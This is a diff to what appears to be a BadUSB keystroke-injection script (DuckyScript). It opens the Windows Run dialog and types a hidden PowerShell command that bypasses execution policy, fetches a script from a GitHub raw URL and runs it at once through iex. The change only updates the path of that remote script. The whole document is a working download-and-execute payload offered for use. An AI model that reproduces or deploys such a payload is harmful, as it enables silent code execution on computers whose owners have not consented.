@@ -1,5 +1,5 @@
 DELAY 300
 GUI r
 DELAY 300
-STRING powershell -NoP -NonI -Exec Bypass -w h -c irm https://raw.githubusercontent.com/mbeskek/flips/main/script%20BD.ps1 | iex
+STRING powershell -NoP -NonI -Exec Bypass -w h -c irm https://raw.githubusercontent.com/mbeskek/flips/main/Scripts/script%20BD.ps1 | iex
 ENTER
